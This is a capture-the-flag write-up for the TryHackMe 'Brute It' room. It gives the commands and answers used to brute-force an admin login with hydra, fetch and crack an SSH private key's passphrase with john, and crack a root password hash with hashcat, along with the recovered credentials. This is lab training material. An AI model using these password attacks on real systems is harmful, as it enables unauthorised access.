# Brute It

[Brute It](https://tryhackme.com/room/bruteit)

## Solution

### Task1

Start the box and make sure it works using `ping $IP`.

### Task2

Q: How many ports are open? A: 2
Q: What version of SSH is running? A: OpenSSH 7.6p1
Q: What version of Apache is running? A: 2.4.29
Q: Which Linux distribution is running? A: ubuntu
Q: What is the hidden directory? A: /admin

### Task3

Q: What is the user:password of the admin panel?

```console
hydra -f -V -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

A: admin:xavier

Q: What is John's RSA Private Key passphrase?

```console
wget http://$IP/admin/panel/id_rsa -O id_rsa
~/.local/share/john/run/ssh2john.py id_rsa > id_rsa.txt
~/.local/share/john/run/john id_rsa.txt
```

A: rockinroll

```console
chmod 600 id_rsa
ssh -i id_rsa john@$IP
```

Use the `rockinroll` as the passphrase.

### Task4

Q: What is the root's password?

```console
hashcat -m 1800 '$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' ~/.local/share/john/run/password.lst
```

A: football
